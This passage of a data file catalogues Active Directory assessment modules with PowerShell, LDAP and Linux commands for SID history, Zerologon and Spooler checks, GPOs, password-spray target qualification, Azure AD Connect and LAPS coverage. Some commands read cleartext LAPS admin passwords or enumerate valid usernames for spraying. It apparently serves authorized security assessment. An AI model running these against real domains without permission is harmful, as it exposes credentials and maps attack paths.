        description: 'PowerShell SID history attribute reads.',
        commands: [
          { id: 'sidh-all-users', title: 'Find users with SID history', command: "Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory } | Select-Object SamAccountName,SIDHistory,DistinguishedName", notes: 'Users with SID history — cross-domain access risk.' },
          { id: 'sidh-all-groups', title: 'Find groups with SID history', command: "Get-ADGroup -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory } | Select-Object Name,SIDHistory", notes: 'Groups with SID history attributes.' },
          { id: 'sidh-privileged-sids', title: 'Find SID history with privileged SIDs', command: "Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory -match 'S-1-5-21.*-(512|519|544|518|548)' } | Select-Object SamAccountName,SIDHistory", notes: 'Matches DA (512), EA (519), BA (544), SA (518), AO (548) SIDs.' },
          { id: 'sidh-trust-filter', title: 'Review SID filter on trusts', command: 'Get-ADTrust -Filter * | Select-Object Name,SIDFilteringQuarantined,SIDFilteringForestAware,TrustType,TrustAttributes', notes: 'SIDFilteringQuarantined=false on external trust is critical.' },
          { id: 'sidh-forestaware', title: 'Find forest-aware trust SID filter state', command: 'Get-ADTrust -Filter {TrustType -eq "Forest"} | Select-Object Name,SIDFilteringForestAware,TrustAttributes', notes: 'ForestAware=false = ExtraSids injection risk across forest.' },
        ],
      },
      {
        id: 'sidh-ldap', name: 'LDAP SID history queries',
        description: 'Cross-platform SID history discovery.',
        commands: [
          { id: 'sidh-ldap-users', title: 'Find SID history users (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(sIDHistory=*)" sAMAccountName sIDHistory distinguishedName objectClass', notes: 'All objects with SID history attribute.' },
          { id: 'sidh-ldap-count', title: 'Count SID history objects', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(sIDHistory=*)" dn | grep "^dn:" | wc -l', notes: 'Scope estimation for SID history presence.' },
          { id: 'sidh-ldap-trusts', title: 'Read trust SIDFiltering attributes', command: 'ldapsearch -x -H ldap://<IP> -b "cn=system,dc=corp,dc=com" "(objectClass=trustedDomain)" cn trustAttributes flatName securityIdentifier', notes: 'trustAttributes bit 4 = SID Filtering quarantine enabled.' },
        ],
      },
    ],
    excluded_capabilities: ['SID history injection', 'ExtraSids exploitation', 'trust ticket forgery'],
  },
  {
    id: 'netlogon_config',
    name: 'Netlogon and Secure Channel',
    category: 'infrastructure',
    description: 'Netlogon service state, secure channel validation, VulnCheckEnabled (Zerologon mitigation), machine password rotation, and Netlogon event monitoring.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'netlogon-windows', name: 'Windows Netlogon checks',
        description: 'Native Netlogon and secure channel validation.',
        commands: [
          { id: 'netlogon-service', title: 'Check Netlogon service state', command: 'Get-Service Netlogon | Select-Object Name,Status,StartType', notes: 'Netlogon must be running for domain authentication.' },
          { id: 'netlogon-sc-verify', title: 'Verify secure channel', command: 'nltest /sc_verify:<domain>', notes: 'Validates machine secure channel to domain.' },
          { id: 'netlogon-sc-query', title: 'Query secure channel state', command: 'nltest /sc_query:<domain>', notes: 'Active secure channel DC name and flags.' },
          { id: 'netlogon-zerologon-check', title: 'Check Zerologon mitigation (registry)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters /v FullSecureChannelProtection', notes: '1 = Enforcement mode enabled (Zerologon mitigated). 0 or absent = vulnerable.' },
          { id: 'netlogon-machpass-age', title: 'Check machine password rotation policy', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters /v DisablePasswordChange', notes: '1 = machine password never rotates — stale credential risk.' },
          { id: 'netlogon-events', title: 'Check recent Netlogon events', command: 'Get-WinEvent -LogName System -FilterXPath "*[System[Provider[@Name=\'NETLOGON\']]]" | Select-Object -First 20 TimeCreated,Id,Message', notes: 'Netlogon errors and authentication events.' },
        ],
      },
      {
        id: 'netlogon-linux', name: 'Linux Netlogon checks',
        description: 'Remote Netlogon configuration assessment.',
        commands: [
          { id: 'netlogon-nmap', title: 'Probe Netlogon port (nmap)', command: 'nmap -p 445 --script smb-security-mode,smb2-security-mode <IP>', notes: 'SMB signing as Netlogon security context indicator.' },
          { id: 'netlogon-impacket-check', title: 'Check Zerologon patch state (impacket)', command: 'python3 zerologon_check.py <dc_netbios_name> <IP>', notes: 'Authorized check only — tests Netlogon response to determine patch state.' },
        ],
      },
    ],
    excluded_capabilities: ['Zerologon exploitation', 'secure channel reset', 'machine password extraction'],
  },
  {
    id: 'spooler_enum',
    name: 'Print Spooler and Coercion Surface',
    category: 'infrastructure',
    description: 'Print Spooler service state, MS-RPRN exposure, Print Nightmare patch status, WebClient state, and NTLM coercion prerequisite mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'spooler-windows', name: 'Windows Print Spooler checks',
        description: 'Spooler service and patch status checks.',
        commands: [
          { id: 'spooler-service', title: 'Check Spooler service state', command: 'Get-Service Spooler | Select-Object Name,Status,StartType', notes: 'Running Spooler on a DC = PrinterBug + PrintNightmare surface.' },
          { id: 'spooler-all-dcs', title: 'Check Spooler on all DCs', command: 'Get-ADDomainController -Filter * | ForEach-Object { Invoke-Command -ComputerName $_.Name -ScriptBlock { Get-Service Spooler | Select-Object Name,Status } -ErrorAction SilentlyContinue }', notes: 'Bulk Spooler check across all domain controllers.' },
          { id: 'spooler-registry', title: 'Check Spooler registry autostart', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler /v Start', notes: '2=Automatic, 4=Disabled. Disabled post-PrintNightmare fix.' },
          { id: 'spooler-print-nightmare-policy', title: 'Check PointAndPrint policy', command: 'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint" /v UpdatePromptSettings', notes: '0=no prompt (vulnerable), 1=warning, 2=prompt. Check alongside NoWarningNoElevationOnInstall.' },
          { id: 'spooler-webclient', title: 'Check WebClient service', command: 'Get-Service WebClient -ErrorAction SilentlyContinue | Select-Object Name,Status,StartType', notes: 'Running WebClient enables HTTP relay chains from coercion.' },
        ],
      },
      {
        id: 'spooler-linux', name: 'Linux Spooler checks',
        description: 'Remote coercion prerequisite assessment.',
        commands: [
          { id: 'spooler-rpcdump', title: 'Enumerate RPC endpoints (impacket)', command: 'impacket-rpcdump <domain>/<user>:<pass>@<IP> | grep -i "spooler\|winspool\|print"', notes: 'Checks if MS-RPRN (spooler) is exposed over RPC.' },
          { id: 'spooler-coercer-scan', title: 'Coercion surface scan (Coercer)', command: 'coercer scan -t <IP> -u <user> -p <pass> -d <domain>', notes: 'Scans all coercion protocols including MS-RPRN without triggering.' },
          { id: 'spooler-nmap-rpc', title: 'Probe RPC endpoints', command: 'nmap -p 135 --script msrpc-enum <IP>', notes: 'RPC endpoint enumeration for Spooler and other coercion targets.' },
        ],
      },
    ],
    excluded_capabilities: ['PrintNightmare exploitation', 'NTLM coercion triggering', 'Spooler DLL injection'],
  },
  {
    id: 'gpo_deep',
    name: 'Group Policy Deep Analysis',
    category: 'policy',
    description: 'GPO modification timestamps, orphaned GPOs, restricted groups, password push, software installation, logon scripts, GPO delegation, and WMI filter analysis.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'gpo-deep-windows', name: 'Windows GPO deep analysis',
        description: 'Comprehensive GPO visibility.',
        commands: [
          { id: 'gpo-recently-modified', title: 'Find recently modified GPOs', command: 'Get-GPO -All | Where-Object {$_.ModificationTime -gt (Get-Date).AddDays(-30)} | Select-Object DisplayName,ModificationTime,Id | Sort-Object ModificationTime -Descending', notes: 'GPO changes in last 30 days — useful for timeline and backdoor review.' },
          { id: 'gpo-orphaned', title: 'Find orphaned GPOs', command: 'Get-GPO -All | Where-Object { $_ | Get-GPOReport -ReportType Xml | Select-String -NotMatch "<LinksTo>" } | Select-Object DisplayName,Id', notes: 'Unlinked GPOs — attack surface without active effect.' },
          { id: 'gpo-all-perms', title: 'Enumerate GPO permissions', command: 'Get-GPO -All | ForEach-Object { $gpo=$_.DisplayName; Get-GPPermission -Guid $_.Id -All | Where-Object {$_.Permission -match "GpoEdit|GpoCreate|GpoApply"} | Select-Object @{N="GPO";E={$gpo}},Trustee,Permission }', notes: 'Who can edit, create, or apply each GPO.' },
          { id: 'gpo-wmi-filters', title: 'List WMI filters', command: 'Get-ADObject -SearchBase "CN=SOM,CN=WMIPolicy,CN=System,DC=corp,DC=com" -Filter * | Select-Object Name,DistinguishedName', notes: 'WMI filters can restrict or expand GPO scope.' },
          { id: 'gpo-startup-scripts', title: 'Check GPO startup/logon scripts', command: 'Get-GPO -All | ForEach-Object { $r = [xml](Get-GPOReport -Guid $_.Id -ReportType Xml); $r.SelectNodes("//StartupScripts/Script | //LogonScripts/Script") | ForEach-Object { [PSCustomObject]@{GPO=$_.GPO;Script=$_.Command} } }', notes: 'Startup/logon scripts in GPO — execution on startup or logon.' },
          { id: 'gpo-restricted-groups', title: 'Find restricted group policies', command: 'Get-GPO -All | ForEach-Object { $r=[xml](Get-GPOReport -Guid $_.Id -ReportType Xml); $r.SelectNodes("//RestrictedGroup") | ForEach-Object { "$($_.GPOName): $($_.GroupName)" } }', notes: 'Restricted Groups GPO — forced group membership across scope.' },
          { id: 'gpo-password-policy', title: 'Review password policy GPOs', command: 'Get-GPO -All | ForEach-Object { $r=[xml](Get-GPOReport -Guid $_.Id -ReportType Xml); if ($r.SelectNodes("//Account/Name[text()=\'MinimumPasswordLength\']")) { "$($_.DisplayName): min pwd length present" } }', notes: 'Locates GPOs that define password policy.' },
        ],
      },
      {
        id: 'gpo-ldap', name: 'LDAP GPO queries',
        description: 'Cross-platform GPO analysis.',
        commands: [
          { id: 'gpo-ldap-all', title: 'Enumerate all GPOs (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=policies,cn=system,dc=corp,dc=com" "(objectClass=groupPolicyContainer)" cn displayName gPCFileSysPath versionNumber whenChanged', notes: 'Full GPO object inventory with version and SYSVOL path.' },
          { id: 'gpo-ldap-links', title: 'Find OU GPO links', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(gPLink=*)" distinguishedName gPLink gPOptions', notes: 'Which OUs have GPOs linked and with what options.' },
          { id: 'gpo-ldap-owner', title: 'Find GPO object owners', command: 'ldapsearch -x -H ldap://<IP> -b "cn=policies,cn=system,dc=corp,dc=com" "(objectClass=groupPolicyContainer)" cn nTSecurityDescriptor', notes: 'Owner determines who can always modify DACL.' },
        ],
      },
    ],
    excluded_capabilities: ['GPO creation', 'policy deployment', 'restricted group modification'],
  },
  {
    id: 'dc_inventory_deep',
    name: 'Domain Controller Deep Inventory',
    category: 'infrastructure',
    description: 'All DC roles, FSMO holders, OS version per DC, SYSVOL replication mode (FRS vs DFSR), DC tier mapping, writable vs read-only, and site assignments.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'dc-windows', name: 'Windows DC inventory',
        description: 'Comprehensive DC visibility via PowerShell.',
        commands: [
          { id: 'dc-all-controllers', title: 'Full DC inventory', command: 'Get-ADDomainController -Filter * | Select-Object Name,IPv4Address,IPv6Address,Site,IsGlobalCatalog,IsReadOnly,OperatingSystem,OperatingSystemVersion,ComputerObjectDN | Sort-Object Site', notes: 'All DCs with role flags, site, and OS.' },
          { id: 'dc-fsmo-roles', title: 'List FSMO role holders', command: 'Get-ADDomain | Select-Object PDCEmulator,RIDMaster,InfrastructureMaster; Get-ADForest | Select-Object SchemaMaster,DomainNamingMaster', notes: 'Five FSMO roles across domain and forest.' },
          { id: 'dc-global-catalogs', title: 'Find Global Catalog DCs', command: 'Get-ADDomainController -Filter {IsGlobalCatalog -eq $true} | Select-Object Name,Site,IPv4Address', notes: 'GC DCs — also respond on port 3268/3269.' },
          { id: 'dc-sysvol-mode', title: 'Check SYSVOL replication mode', command: 'dfsrmig /GetMigrationState', notes: 'Shows FRS vs DFSR migration state — FRS is legacy and unsupported.' },
          { id: 'dc-dfsr-state', title: 'DFSR replication state', command: 'Get-DfsrMember -GroupName "Domain System Volume" | Get-DfsrState | Select-Object ComputerName,State,StateDescription', notes: 'DFSR health for SYSVOL replication.' },
          { id: 'dc-os-per-dc', title: 'OS version per DC', command: 'Get-ADDomainController -Filter * | Select-Object Name,OperatingSystem,OperatingSystemVersion | Sort-Object OperatingSystemVersion', notes: 'Flags legacy or mixed-version DC environments.' },
          { id: 'dc-time-sync', title: 'Check PDC time source', command: 'w32tm /query /computer:<PDCName> /source', notes: 'PDC must sync to authoritative external time source.' },
        ],
      },
      {
        id: 'dc-ldap', name: 'LDAP DC inventory',
        description: 'Cross-platform DC discovery.',
        commands: [
          { id: 'dc-ldap-all', title: 'Enumerate DCs (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "ou=domain controllers,dc=corp,dc=com" "(objectClass=computer)" cn dNSHostName userAccountControl operatingSystem msDS-isRODC', notes: 'All DC computer objects with flags.' },
          { id: 'dc-ldap-fsmo', title: 'Read FSMO role references (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -s base -b "" fSMORoleOwner; ldapsearch -x -H ldap://<IP> -b "cn=schema,cn=configuration,dc=corp,dc=com" -s base "(objectClass=dMD)" fSMORoleOwner', notes: 'FSMO role holder DNs.' },
          { id: 'dc-ldap-ntds-settings', title: 'Read NTDS settings per DC (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=nTDSDSA)" cn options distinguishedName', notes: 'Per-DC NTDS settings including GC flag.' },
        ],
      },
    ],
    excluded_capabilities: ['DC exploitation', 'FSMO role seizure'],
  },
  {
    id: 'password_spray_surface',
    name: 'Password Spray Surface Analysis',
    category: 'credential-access',
    description: 'Spray-safe account enumeration, lockout policy per OU, enabled accounts without expiry, accounts with PASSWD_NOTREQUIRED, default passwords, and spray target qualification.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'spray-windows', name: 'Windows spray surface enumeration',
        description: 'Account attribute analysis for spray qualification.',
        commands: [
          { id: 'spray-lockout-policy', title: 'Review lockout policy', command: 'Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold,LockoutDuration,LockoutObservationWindow', notes: 'Threshold of 0 = no lockout. Threshold <5 = spray carefully.' },
          { id: 'spray-enabled-no-expiry', title: 'Find enabled accounts without expiry', command: 'Get-ADUser -Filter {Enabled -eq $true -and PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires,PasswordLastSet | Select-Object SamAccountName,PasswordLastSet | Sort-Object PasswordLastSet', notes: 'Long-lived passwords are spray targets.' },
          { id: 'spray-passwd-notreqd', title: 'Find PASSWD_NOTREQD accounts', command: 'Get-ADUser -Filter * -Properties UserAccountControl | Where-Object {$_.UserAccountControl -band 32} | Select-Object SamAccountName,DistinguishedName', notes: 'Accounts that may have empty or no password set.' },
          { id: 'spray-never-logged-in', title: 'Find enabled accounts never used', command: 'Get-ADUser -Filter {Enabled -eq $true -and LastLogonDate -eq $null} -Properties LastLogonDate,PasswordLastSet | Select-Object SamAccountName,PasswordLastSet', notes: 'Never-logged-in accounts often have default provisioning passwords.' },
          { id: 'spray-bad-logon-count', title: 'Review badPwdCount across users', command: 'Get-ADUser -Filter * -Properties badPwdCount,badPasswordTime | Where-Object {$_.badPwdCount -gt 0} | Select-Object SamAccountName,badPwdCount,badPasswordTime | Sort-Object badPwdCount -Descending', notes: 'Non-zero badPwdCount = recent failed auth attempts.' },
        ],
      },
      {
        id: 'spray-ldap', name: 'LDAP spray surface queries',
        description: 'Cross-platform spray surface discovery.',
        commands: [
          { id: 'spray-ldap-enabled-count', title: 'Count enabled user accounts', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" dn | grep "^dn:" | wc -l', notes: 'Total enabled user count for spray scope.' },
          { id: 'spray-ldap-passwd-notreqd', title: 'Find PASSWD_NOTREQD (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName', notes: 'Empty or blank password candidates.' },
          { id: 'spray-kerbrute', title: 'Enumerate valid usernames (kerbrute)', command: 'kerbrute userenum -d <domain> --dc <DC_IP> <userlist.txt> --safe', notes: 'Validates usernames before spray — avoids lockout on invalid accounts. Authorized use only.' },
          { id: 'spray-ldap-badpwd', title: 'Check badPasswordTime (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(badPwdCount>=1))" sAMAccountName badPwdCount badPasswordTime', notes: 'Accounts with recent failed login attempts.' },
        ],
      },
    ],
    excluded_capabilities: ['password spraying execution', 'credential brute-force', 'account lockout'],
  },
  {
    id: 'cross_forest_enum',
    name: 'Cross-Forest Enumeration',
    category: 'topology',
    description: 'Trusted forest domain enumeration, cross-forest SPN discovery, selective authentication gaps, forest-wide group membership, and pivot surface mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'xforest-windows', name: 'Windows cross-forest queries',
        description: 'PowerShell forest trust and cross-forest enumeration.',
        commands: [
          { id: 'xforest-list-forests', title: 'List trusted forests', command: 'Get-ADForest | Select-Object -ExpandProperty Trusts', notes: 'All inter-forest trust relationships.' },
          { id: 'xforest-enterprise-admins', title: 'Check Enterprise Admins across forests', command: 'Get-ADForest | ForEach-Object { Get-ADGroupMember "Enterprise Admins" -Server $_.Name -ErrorAction SilentlyContinue | Select-Object Name,SamAccountName,@{N="Forest";E={$_.ForestName}} }', notes: 'Cross-forest EA membership inventory.' },
          { id: 'xforest-auth-scope', title: 'Check cross-forest selective authentication', command: 'Get-ADTrust -Filter {TrustType -eq "Forest"} | Select-Object Name,SelectiveAuthentication,SIDFilteringForestAware,Direction', notes: 'SelectiveAuthentication=false = any forest user can authenticate.' },
          { id: 'xforest-foreign-principals', title: 'Find foreign security principals', command: 'Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=com" -Filter * | Select-Object Name,DistinguishedName', notes: 'Foreign users/groups granted local access via FSP objects.' },
          { id: 'xforest-ldap-globalcat', title: 'Query Global Catalog for forest users', command: 'ldapsearch -x -H ldap://<GC_IP>:3268 -b "" "(objectClass=user)" sAMAccountName distinguishedName', notes: 'GC port 3268 returns objects from all domains in the forest.' },
        ],
      },
      {
        id: 'xforest-ldap', name: 'LDAP cross-forest queries',
        description: 'LDAP-based cross-forest enumeration.',
        commands: [
          { id: 'xforest-gc-computers', title: 'Enumerate all forest computers via GC', command: 'ldapsearch -x -H ldap://<GC_IP>:3268 -b "" "(objectClass=computer)" dNSHostName operatingSystem distinguishedName', notes: 'All domain-joined computers across the entire forest.' },
          { id: 'xforest-gc-trusts', title: 'Enumerate trusts via GC', command: 'ldapsearch -x -H ldap://<GC_IP>:3268 -b "" "(objectClass=trustedDomain)" cn trustType trustAttributes trustDirection', notes: 'All trust objects across all forest domains.' },
          { id: 'xforest-gc-admincount', title: 'Find adminCount objects across forest', command: 'ldapsearch -x -H ldap://<GC_IP>:3268 -b "" "(adminCount=1)" cn sAMAccountName distinguishedName objectClass', notes: 'All protected objects across all forest domains.' },
          { id: 'xforest-foreign-group-members', title: 'Find cross-forest group memberships', command: 'Get-ADGroup -Filter * | ForEach-Object { Get-ADGroupMember $_ | Where-Object {$_.distinguishedName -notmatch "DC=corp,DC=com"} | Select-Object Name,DistinguishedName,@{N="Group";E={$_.Name}} }', notes: 'Groups with members from other domains.' },
        ],
      },
    ],
    excluded_capabilities: ['cross-forest exploitation', 'trust ticket forgery', 'forest pivot execution'],
  },
  {
    id: 'azure_ad_connect_enum',
    name: 'Azure AD Connect and Hybrid Identity',
    category: 'hybrid',
    description: 'AADConnect server discovery, MSOL account privileges, sync mode (PHS/PTA/ADFS), writeback configuration, metaverse access, and hybrid identity attack surface.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'aadc-discovery', name: 'Azure AD Connect server discovery',
        description: 'Find AADConnect infrastructure components.',
        commands: [
          { id: 'aadc-find-msol', title: 'Find MSOL sync account', command: 'Get-ADUser -Filter {SamAccountName -like "MSOL_*"} -Properties PasswordLastSet,LastLogonDate,ServicePrincipalName | Select-Object SamAccountName,PasswordLastSet,LastLogonDate', notes: 'MSOL_ account has DCSync rights by default.' },
          { id: 'aadc-find-aadconnect', title: 'Find AADConnect server', command: 'Get-ADComputer -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -match "ADSync"} | Select-Object Name,ServicePrincipalName', notes: 'AADConnect server via SPN registration.' },
          { id: 'aadc-adsync-service', title: 'Check ADSync service', command: 'Get-Service ADSync -ErrorAction SilentlyContinue | Select-Object Name,Status,StartType', notes: 'ADSync running = this host is the AADConnect server.' },
          { id: 'aadc-msol-perms', title: 'Check MSOL account permissions', command: "Get-ADUser -Filter {SamAccountName -like 'MSOL_*'} | ForEach-Object { (Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -match $_.SamAccountName} | Select-Object IdentityReference,ActiveDirectoryRights }", notes: 'MSOL_ account ACEs on domain root — DCSync pattern.' },
          { id: 'aadc-adfs-find', title: 'Find ADFS servers', command: 'Get-ADComputer -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -match "host/adfs"} | Select-Object Name', notes: 'ADFS server discovery via SPN.' },
        ],
      },
      {
        id: 'aadc-ldap', name: 'LDAP hybrid identity queries',
        description: 'Cross-platform AADConnect enumeration.',
        commands: [
          { id: 'aadc-ldap-msol', title: 'Find MSOL account (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(sAMAccountName=MSOL_*)" sAMAccountName pwdLastSet lastLogon userAccountControl', notes: 'MSOL sync account discovery via LDAP.' },
          { id: 'aadc-roadtools', title: 'Enumerate Entra tenant (ROADtools)', command: 'roadrecon auth -t <TenantID> -u <user>@<domain> -p <pass> && roadrecon gather', notes: 'Authorized hybrid identity assessment using ROADtools.' },
          { id: 'aadc-ldap-adsync-computer', title: 'Find ADSync computer objects (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(servicePrincipalName=ADSync/*)" dNSHostName sAMAccountName servicePrincipalName', notes: 'ADConnect server computer object in AD.' },
        ],
      },
    ],
    excluded_capabilities: ['DCSync via MSOL', 'token theft', 'Entra tenant takeover'],
  },
  {
    id: 'laps_coverage',
    name: 'LAPS Coverage Gap Analysis',
    category: 'host-access',
    description: 'Identify computers missing LAPS coverage, Windows LAPS vs legacy LAPS deployment mix, LAPS expiry staleness, and computers where LAPS password is readable in current context.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'laps-gaps-windows', name: 'Windows LAPS gap analysis',
        description: 'Coverage gap identification and LAPS deployment state.',
        commands: [
          { id: 'laps-gap-no-laps', title: 'Find computers without any LAPS', command: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime,msLAPS-PasswordExpirationTime | Where-Object { -not $_."ms-Mcs-AdmPwdExpirationTime" -and -not $_."msLAPS-PasswordExpirationTime" -and $_.Enabled } | Select-Object Name,OperatingSystem | Sort-Object Name', notes: 'Computers with no LAPS of either type — local admin passwords unknown.' },
          { id: 'laps-gap-stale', title: 'Find stale LAPS expiry', command: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -and [datetime]::FromFileTime([int64]$_."ms-Mcs-AdmPwdExpirationTime") -lt (Get-Date).AddDays(-90) } | Select-Object Name,ms-Mcs-AdmPwdExpirationTime', notes: 'LAPS expiry more than 90 days past = password not rotating.' },
          { id: 'laps-gap-mixed', title: 'Identify legacy vs Windows LAPS mix', command: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime,msLAPS-PasswordExpirationTime | Select-Object Name,@{N="LegacyLAPS";E={[bool]$_."ms-Mcs-AdmPwdExpirationTime"}},@{N="WindowsLAPS";E={[bool]$_."msLAPS-PasswordExpirationTime"}} | Group-Object LegacyLAPS,WindowsLAPS | Select-Object Name,Count', notes: 'Mixed deployment visibility.' },
          { id: 'laps-gap-readable', title: 'Test LAPS readability (current context)', command: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { $_."ms-Mcs-AdmPwd" } | Select-Object Name,ms-Mcs-AdmPwd', notes: 'Returns LAPS passwords readable by the current account — scope check only.' },
          { id: 'laps-gap-wlaps-readable', title: 'Test Windows LAPS readability', command: 'Get-ADComputer -Filter * -Properties msLAPS-Password | Where-Object { $_."msLAPS-Password" } | Select-Object Name,msLAPS-Password', notes: 'Windows LAPS cleartext readable by current account.' },
        ],
      },
      {
        id: 'laps-gaps-ldap', name: 'LDAP LAPS gap analysis',
        description: 'Cross-platform LAPS coverage analysis.',
        commands: [
          { id: 'laps-ldap-coverage', title: 'LAPS-covered computer count (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(ms-Mcs-AdmPwdExpirationTime=*)" dn | grep "^dn:" | wc -l', notes: 'Legacy LAPS coverage count.' },
          { id: 'laps-ldap-wlaps-coverage', title: 'Windows LAPS computer count (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(msLAPS-PasswordExpirationTime=*)" dn | grep "^dn:" | wc -l', notes: 'Windows LAPS coverage count.' },
          { id: 'laps-ldap-extended-rights', title: 'Find LAPS extended rights', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=computer)" nTSecurityDescriptor | grep -i "ms-Mcs-AdmPwd"', notes: 'Who has read rights on LAPS password attribute.' },
        ],
      },
    ],
    excluded_capabilities: ['LAPS password extraction for exploitation'],
  },
  {
    id: 'ad_recycle',
    name: 'AD Recycle Bin and Tombstone',
    category: 'infrastructure',
    description: 'AD Recycle Bin state, deleted object recovery, tombstone lifetime, lingering objects, and recently deleted high-value accounts.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'recycle-windows', name: 'Windows Recycle Bin analysis',
        description: 'Recycle Bin state and deleted object inventory.',
        commands: [
          { id: 'recycle-state', title: 'Check Recycle Bin feature state', command: 'Get-ADOptionalFeature -Filter {Name -eq "Recycle Bin Feature"} | Select-Object Name,EnabledScopes,RequiredForestMode', notes: 'Recycle Bin disabled = deleted objects are immediately tombstoned.' },
          { id: 'recycle-deleted-users', title: 'List recently deleted users', command: 'Get-ADObject -SearchBase (Get-ADDomain | Select-Object -ExpandProperty DeletedObjectsContainer) -Filter {objectClass -eq "user"} -IncludeDeletedObjects -Properties Name,WhenChanged | Select-Object Name,WhenChanged | Sort-Object WhenChanged -Descending | Select-Object -First 30', notes: 'Recently deleted user objects — useful for timeline and forensics.' },
          { id: 'recycle-deleted-computers', title: 'List recently deleted computers', command: 'Get-ADObject -SearchBase (Get-ADDomain | Select-Object -ExpandProperty DeletedObjectsContainer) -Filter {objectClass -eq "computer"} -IncludeDeletedObjects -Properties Name,WhenChanged | Sort-Object WhenChanged -Descending | Select-Object -First 20', notes: 'Recently deleted computer accounts.' },
          { id: 'recycle-tombstone-lifetime', title: 'Check tombstone lifetime', command: '(Get-ADObject -SearchBase "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties tombstoneLifetime).tombstoneLifetime', notes: 'Default 60/180 days. Expired tombstones are permanently gone.' },
          { id: 'recycle-deleted-groups', title: 'List recently deleted groups', command: 'Get-ADObject -SearchBase (Get-ADDomain | Select-Object -ExpandProperty DeletedObjectsContainer) -Filter {objectClass -eq "group"} -IncludeDeletedObjects -Properties Name,WhenChanged | Sort-Object WhenChanged -Descending | Select-Object -First 20', notes: 'Deleted group history.' },
        ],
      },
      {
        id: 'recycle-ldap', name: 'LDAP deleted object queries',
        description: 'Cross-platform deleted object discovery.',
        commands: [
          { id: 'recycle-ldap-deleted', title: 'Find deleted objects (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=deleted objects,dc=corp,dc=com" -E pr=500/noprompt "(objectClass=*)" cn whenChanged isDeleted', notes: 'Requires privileged bind — shows deleted object container.' },
          { id: 'recycle-ldap-feature', title: 'Check Recycle Bin feature (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=optional features,cn=directory service,cn=windows nt,cn=services,cn=configuration,dc=corp,dc=com" "(msDS-OptionalFeatureGUID=766ddcd8-acd0-445e-f3b9-a7f9b6744f2a)" cn msDS-EnabledFeatureBL', notes: 'Recycle Bin feature object in configuration partition.' },
        ],
      },
    ],
    excluded_capabilities: ['object restoration abuse', 'deleted credential recovery'],
  },
  {
    id: 'firewall_enum',
    name: 'Windows Firewall Posture',
    category: 'infrastructure',
